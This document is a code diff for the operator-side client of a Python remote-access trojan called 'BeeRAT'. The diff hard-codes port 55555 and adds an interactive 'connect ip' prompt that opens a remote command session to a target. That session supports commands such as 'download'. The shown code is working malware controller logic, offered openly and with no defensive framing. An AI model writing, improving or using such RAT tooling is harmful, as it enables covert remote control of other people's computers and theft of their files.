@@ -8,9 +8,9 @@ FORMAT = 'utf-8'
 
 
 class Client:
-    def __init__(self, ip, port) -> None:
+    def __init__(self, ip) -> None:
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client.connect((ip, port))
+        self.client.connect((ip, 55555))
 
     def send(self, data):
         json_data = json.dumps(data)
@@ -62,7 +62,7 @@ class Client:
                 command = input(f'{info}# ').split(' ')
                 if command[0] == 'exit':
                     self.send('exit')
-                    exit()
+                    main()
                 elif command[0] == 'clear':
                     Client.clear()
                 elif command[0] == 'download':
@@ -99,16 +99,23 @@ class Client:
 
 def main():
     Client.clear()
-    SERVER = socket.gethostbyname(socket.gethostname())
-    my_client = Client(SERVER, 4444)
-    my_client.run()
-    # while True:
-    #     try:
-    #         ip, port = input('connect ').split(':')
-    #         my_client = Client(ip, int(port))
-    #         my_client.run()
-    #     except Exception:
-    #         print('[-] Error...')
+    while True:
+        try:
+            command = input('BeeRAT-Client$ ').split(' ')
+            if command[0] == 'help' and len(command) == 1:
+                print('[+] connect ip')
+            elif command[0] == 'connect':
+                ip = command[1]
+                my_client = Client(ip)
+                my_client.run()
+            else:
+                print('[-] Unknown command.')
+        except (ConnectionRefusedError, TimeoutError):
+            print('[-] Connection failed.')
+        except (KeyboardInterrupt, EOFError):
+            exit()
+        except Exception as e:
+            print('[-] Invalid ip.')
 
 
 if __name__ == '__main__':
